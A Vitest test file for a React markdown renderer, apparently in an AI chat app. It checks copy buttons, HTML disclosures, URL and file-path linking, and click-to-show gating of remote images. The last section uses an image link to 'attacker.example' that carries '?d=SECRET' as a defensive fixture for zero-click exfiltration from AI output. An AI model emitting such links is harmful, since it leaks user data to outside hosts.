// @vitest-environment jsdom
import '@testing-library/jest-dom/vitest';
import { describe, it, expect, afterEach } from 'vitest';
import { render, screen, cleanup, fireEvent } from '@testing-library/react';
import MarkdownContent from './MarkdownContent';

afterEach(cleanup);

// The regression this pins: the Copy button used to be derived from
// `child.props.children` and only accepted a STRING. rehype-highlight replaces
// the code element's text node with a <span> tree as soon as highlight.js
// recognises ANY token, so the button silently disappeared on exactly the
// blocks worth copying — and survived only on blocks the highlighter failed to
// tokenise. The failure is invisible (a missing button looks like a design
// choice), and `bash` flips between the two states depending on whether the
// snippet happens to contain a comment, so a single sample proves nothing.
// Every variant below must behave identically.
const FENCES: { name: string; md: string; code: string }[] = [
  {
    name: 'no language (highlighter emits no tokens)',
    md: '```\nhello world\n```',
    code: 'hello world\n',
  },
  {
    name: 'bash with nothing colourable',
    md: '```bash\nnpm run build\n```',
    code: 'npm run build\n',
  },
  {
    // The load-bearing case: identical to the one above but for a comment
    // line, which is all it took for highlight.js to tokenise and the button
    // to vanish.
    name: 'bash with a comment',
    md: '```bash\n# install first\nnpm run build\n```',
    code: '# install first\nnpm run build\n',
  },
  { name: 'json', md: '```json\n{"a": 1}\n```', code: '{"a": 1}\n' },
  { name: 'python', md: '```python\ndef f(): return 1\n```', code: 'def f(): return 1\n' },
  { name: 'markdown', md: '```markdown\n# Title\n```', code: '# Title\n' },
  {
    name: 'unknown language',
    md: '```foolang\nabc\n```',
    code: 'abc\n',
  },
];

describe('MarkdownContent fenced code blocks', () => {
  for (const f of FENCES) {
    it(`renders a Copy button for ${f.name}`, () => {
      render(<MarkdownContent content={f.md} />);
      expect(screen.getByRole('button', { name: /copy/i })).toBeInTheDocument();
    });

    it(`copies the full source text for ${f.name}`, async () => {
      const writes: string[] = [];
      Object.assign(navigator, {
        clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
      });
      const { getByRole } = render(<MarkdownContent content={f.md} />);
      getByRole('button', { name: /copy/i }).click();
      // Must be the raw source, not the highlighted markup — the whole point of
      // reading the hast node instead of the rendered children.
      expect(writes).toEqual([f.code]);
    });

    it(`styles ${f.name} as a block, not inline code`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      const code = container.querySelector('pre code');
      expect(code).not.toBeNull();
      // text-code is the INLINE styling. A fenced block must never carry it —
      // an unlanguaged fence used to, because "no className" was read as
      // "inline" and an unlanguaged fence gets no class from the highlighter.
      expect(code!.className).not.toContain('text-code');
    });

    it(`keeps the yc-code hook on the <pre> for ${f.name}`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      // globals.css out-specifies highlight.js's own `pre code.hljs` box via
      // `pre.yc-code code.hljs`. Drop the class and the double-rectangle
      // regression returns, with nothing else to catch it.
      expect(container.querySelector('pre.yc-code')).not.toBeNull();
    });
  }

  it('leaves inline code as inline', () => {
    const { container } = render(<MarkdownContent content={'some `inline` code'} />);
    expect(container.querySelector('pre')).toBeNull();
    expect(container.querySelector('code')!.className).toContain('text-code');
  });

  it('copies only the block that was clicked when several are present', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    render(<MarkdownContent content={'```json\n{"a": 1}\n```\n\ntext\n\n```python\ndef f(): pass\n```'} />);
    const buttons = screen.getAllByRole('button', { name: /copy/i });
    expect(buttons).toHaveLength(2);
    buttons[1].click();
    expect(writes).toEqual(['def f(): pass\n']);
  });
});

describe('MarkdownContent HTML disclosures', () => {
  const disclosure = [
    '<details>',
    '<summary>Key code evidence</summary>',
    '',
    'The renderer keeps **Markdown** inside the disclosure.',
    '',
    '```ts',
    'const value = 1;',
    '```',
    '',
    '</details>',
  ].join('\n');

  it('renders model-generated details markup as an interactive disclosure', () => {
    const { container } = render(<MarkdownContent content={disclosure} />);
    const details = container.querySelector('details');

    expect(details).not.toBeNull();
    expect(details!.querySelector('summary')).toHaveTextContent('Key code evidence');
    expect(details).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(details!.querySelector('strong')).toHaveTextContent('Markdown');
    expect(details!.querySelector('pre code')).toHaveTextContent('const value = 1;');
    expect(container).not.toHaveTextContent('<details>');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('does not expose tags from unsupported HTML blocks', () => {
    const { container } = render(
      <MarkdownContent content={'<aside>\n\nReadable **content**.\n\n</aside>'} />,
    );

    expect(container).toHaveTextContent('Readable content.');
    expect(container).not.toHaveTextContent('<aside>');
    expect(container).not.toHaveTextContent('</aside>');
  });

  it('does not expose or link unsupported HTML attributes', () => {
    const { container } = render(
      <MarkdownContent content={'<span title="> https://example.com">Visible</span>'} />,
    );

    expect(container).toHaveTextContent('Visible');
    expect(container).not.toHaveTextContent('title=');
    expect(container).not.toHaveTextContent('https://example.com');
    expect(container.querySelector('a')).toBeNull();
  });

  it('accepts a blank line between details and summary', () => {
    const spaced = disclosure.replace('<details>\n<summary>', '<details>\n\n<summary>');
    const { container } = render(<MarkdownContent content={spaced} />);

    expect(container.querySelector('details > summary')).toHaveTextContent('Key code evidence');
    expect(container.querySelector('details')).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('keeps disclosure markup non-interactive in preview mode', () => {
    const { container } = render(<MarkdownContent content={disclosure} preview />);

    expect(container.querySelector('details')).toBeNull();
    expect(container).toHaveTextContent('Key code evidence');
    expect(container).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });
});

// ---------------------------------------------------------------------------
// Clickable URLs and file paths.
// The regression this pins: a URL inside backticks (`http://127.0.0.1:8931/`)
// rendered as dead text. remark-gfm only autolinks BARE urls in prose, so
// anything Claude wrapped in code — inline or fenced — could not be clicked.
// ---------------------------------------------------------------------------
describe('MarkdownContent links', () => {
  const hrefs = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('a')).map((a) => a.getAttribute('href'));

  it('links a bare URL in prose', () => {
    const { container } = render(<MarkdownContent content={'see https://example.com now'} />);
    expect(hrefs(container)).toEqual(['https://example.com']);
  });

  it('links a URL inside inline code', () => {
    const { container } = render(<MarkdownContent content={'run `http://127.0.0.1:8931/`'} />);
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    // The link must still LOOK like the code it was written as.
    expect(container.querySelector('code a')).not.toBeNull();
  });

  it('links a URL inside a fenced code block', () => {
    const { container } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    expect(container.querySelector('pre a')).not.toBeNull();
  });

  it('links a URL inside a languaged fenced block (highlighter has already split the text)', () => {
    const { container } = render(
      <MarkdownContent content={'```bash\ncurl https://example.com/api\n```'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/api']);
  });

  it('opens links in the system browser, not in the app', () => {
    // target=_blank is what Electron's setWindowOpenHandler turns into
    // shell.openExternal, and what Android's shouldOverrideUrlLoading turns
    // into an ACTION_VIEW intent. Without it the link would navigate the app.
    const { container } = render(<MarkdownContent content={'see https://example.com'} />);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('never nests a link inside a markdown link', () => {
    const { container } = render(
      <MarkdownContent content={'[the docs](https://example.com/docs)'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/docs']);
    expect(container.querySelectorAll('a a')).toHaveLength(0);
  });

  it('keeps the URL in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['open http://127.0.0.1:8931/\n']);
  });

  it('links a URL in a table cell, a heading and bold text', () => {
    // Every one of these is a different parent element in the tree; the token
    // splitter works on text nodes, so all of them must behave the same.
    for (const md of [
      '| a |\n| --- |\n| https://example.com |',
      '## https://example.com',
      '**https://example.com**',
      '> https://example.com',
      '- https://example.com',
    ]) {
      const { container, unmount } = render(<MarkdownContent content={md} />);
      expect(hrefs(container), md).toEqual(['https://example.com']);
      unmount();
    }
  });

  it('renders links as plain text in preview mode', () => {
    const { container } = render(
      <MarkdownContent content={'see https://example.com'} preview />,
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('https://example.com');
  });
});

describe('MarkdownContent file paths', () => {
  const paths = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('button[data-file-path]')).map((b) => b.textContent);

  it('makes an absolute path in prose clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open /home/destin/plan.md'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['plan.md']);
  });

  it('makes a path inside inline code clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open `~/notes/todo.md`'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['todo.md']);
  });

  it('makes a path inside a fenced code block clickable, showing the whole path', () => {
    // In a code block the chip would break the monospace grid and hide the rest
    // of the command, so the token keeps the path exactly as written.
    const { container } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['/home/destin/plan.md']);
  });

  it('keeps the path in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['cat /home/destin/plan.md\n']);
  });

  it('makes media, archive and script paths clickable, not just readable documents', () => {
    // Before 2026-09-05 only a short list of viewable types pilled, so a path
    // to an .mp3 or a .zip could not be clicked at all.
    for (const [md, label] of [
      ['play /home/d/song.mp3', 'song.mp3'],
      ['watch /home/d/clip.mp4', 'clip.mp4'],
      ['unzip /home/d/bundle.zip', 'bundle.zip'],
      ['run scripts/deploy.sh', 'deploy.sh'],
    ] as const) {
      const { container, unmount } = render(<MarkdownContent content={md} sessionId="s1" />);
      expect(paths(container), md).toEqual([label]);
      unmount();
    }
  });

  it('leaves paths alone when there is no session to resolve them against', () => {
    const { container } = render(<MarkdownContent content={'open /home/destin/plan.md'} />);
    expect(paths(container)).toEqual([]);
    expect(container.textContent).toContain('/home/destin/plan.md');
  });
});

// 2026-09-10 security review (Destin's "tap to show"): a picture from a WEBSITE
// must not load until the person taps Show — its address can carry stolen text,
// so an auto-loaded remote image is a zero-click exfiltration channel. A data:
// image has no network fetch and renders immediately.
describe('remote images wait for a tap; local images render inline', () => {
  it('a website image renders a Show button, not an <img>, until tapped', () => {
    render(<MarkdownContent content={'![cat](https://attacker.example/p.png?d=SECRET)'} />);
    // No <img> has hit the DOM (no request left the machine).
    expect(document.querySelector('img')).toBeNull();
    const btn = screen.getByRole('button', { name: /image from attacker\.example/i });
    expect(btn).toBeInTheDocument();
    fireEvent.click(btn);
    const img = document.querySelector('img');
    expect(img).not.toBeNull();
    expect(img!.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET');
  });

  it('a data: image is never gated as a remote fetch (no Show button)', () => {
    // react-markdown's default urlTransform already drops data: srcs, so the
    // point is only that a data: image is NOT treated as a website fetch.
    render(<MarkdownContent content={'![dot](data:image/png;base64,iVBORw0KGgo=)'} />);
    expect(screen.queryByRole('button', { name: /image from/i })).toBeNull();
  });
});
